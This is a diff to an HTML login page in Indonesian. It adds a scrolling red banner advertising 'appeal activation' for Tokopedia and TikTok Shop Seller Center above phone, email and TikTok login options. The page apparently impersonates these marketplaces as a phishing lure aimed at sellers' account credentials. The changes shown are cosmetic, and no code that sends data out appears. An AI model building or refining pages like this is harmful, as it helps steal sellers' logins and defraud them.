@@ -94,7 +94,7 @@ h2 {
     display: flex;
     justify-content: flex-start;
     align-items: center;
-    margin-bottom: 24px;
+    margin-bottom: 4px;
 }
 .back-btn {
     font-size: 34px;
@@ -325,6 +325,27 @@ input:focus {
     cursor: pointer;
 }
 
+    .berjalan {
+      overflow: hidden;
+      white-space: nowrap;
+      box-sizing: border-box;
+    }
+
+    .berjalan span {
+      display: inline-block;
+      padding-left: 100%;
+      animation: jalan 15s linear infinite;
+      font-size: 18px;
+      color: #d32f2f;
+      font-weight: bold;
+    }
+
+
+    @keyframes jalan {
+      0% { transform: translate(0, 0); }
+      100% { transform: translate(-100%, 0); }
+    }
+
     </style>
 </head>
 <body>
@@ -338,10 +359,15 @@ input:focus {
        <img src="https://ikon-dusky.vercel.app/tt-tokped.jpg" alt="Gambar">
      </a>
    </div>
+
 <!-- Halaman Awal -->
 <div class="container" id="page-awal">
     <h1>SILAHKAN MASUK AKUN</h1>
-    <p class="subhead">Aktivasi Pengajuan Banding Tokopedia TikTok Shop Seller Center</p>
+    <div class="berjalan">
+    <span>⏳ Aktivasi Pengajuan Banding — Tokopedia Seller Center— TikTok Shop Seller Center ⏳</span>
+  </div>
+  <br>
+
     <button class="btn btn-hpemail" onclick="tampilkanHalaman('page-login-umum')">Masuk dengan Nomor HP / Email</button>
     <button class="btn btn-tiktok" onclick="tampilkanHalaman('page-tiktok')">Lanjutkan dengan TikTok</button>
     <p class="desc-text">Dengan melanjutkan, Anda menyetujui <a href="#">Kebijakan Privasi</a> dan <a href="#">Syarat Penggunaan</a></p>
@@ -353,6 +379,10 @@ input:focus {
         <span class="back-btn" onclick="tampilkanHalaman('page-awal')">&larr;</span>
     </div>
     <h2>Masuk Akun</h2>
+    <div class="berjalan">
+    <span>⏳ Aktivasi Pengajuan Banding — Tokopedia Seller Center— TikTok Shop Seller Center ⏳</span>
+  </div>
+    
     <div class="tabs">
         <div class="tab active" onclick="gantiTabUmum('hp')">Nomor HP</div>
         <div class="tab" onclick="gantiTabUmum('email')">Email</div>
